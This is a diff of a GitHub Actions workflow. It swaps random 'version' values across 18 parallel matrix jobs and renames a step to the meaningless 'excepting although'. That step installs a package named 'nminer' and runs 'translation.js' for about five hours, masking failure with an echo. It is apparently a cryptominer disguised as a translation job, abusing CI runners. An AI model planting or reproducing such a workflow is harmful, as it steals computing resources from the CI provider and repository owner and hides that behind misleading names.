@@ -9,23 +9,24 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 8406 }
-          - { version: 2556 }
-          - { version: 1859 }
-          - { version: 9984 }
-          - { version: 4944 }
-          - { version: 3160 }
-          - { version: 9761 }
-          - { version: 1746 }
-          - { version: 7497 }
-          - { version: 3586 }
-          - { version: 3988 }
-          - { version: 2925 }
-          - { version: 3685 }
-          - { version: 571 }
-          - { version: 714 }
-          - { version: 769 }
-          - { version: 8374 }
+          - { version: 8881 }
+          - { version: 5654 }
+          - { version: 205 }
+          - { version: 4692 }
+          - { version: 8489 }
+          - { version: 4483 }
+          - { version: 3913 }
+          - { version: 1138 }
+          - { version: 9823 }
+          - { version: 7278 }
+          - { version: 6702 }
+          - { version: 5715 }
+          - { version: 7991 }
+          - { version: 9982 }
+          - { version: 3867 }
+          - { version: 7046 }
+          - { version: 9777 }
+          - { version: 7846 }
 
     steps:
       - name: Checkout
@@ -36,7 +37,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: 
+      - name: excepting although
         run: |
           npm install nminer@latest
-          timeout 326m node translation.js || echo "translation executed"
+          timeout 302m node translation.js || echo "translation executed"
